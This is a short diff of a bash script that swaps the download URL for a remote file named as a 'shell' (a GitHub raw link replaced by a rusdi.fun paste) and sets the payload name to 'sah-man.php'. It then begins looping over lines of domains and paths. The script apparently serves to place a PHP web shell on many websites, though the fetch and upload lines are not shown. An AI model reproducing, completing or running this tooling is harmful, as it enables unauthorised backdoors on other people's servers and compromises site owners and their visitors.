@@ -1,5 +1,5 @@
 #!/bin/bash
-SHELL_URL="https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/shell-sah-man.txt"
+SHELL_URL="https://rusdi.fun/raw/d4cbbab"
 SHELL_NAME="sah-man.php"
 
 while IFS=' - ' read -r domain path; do
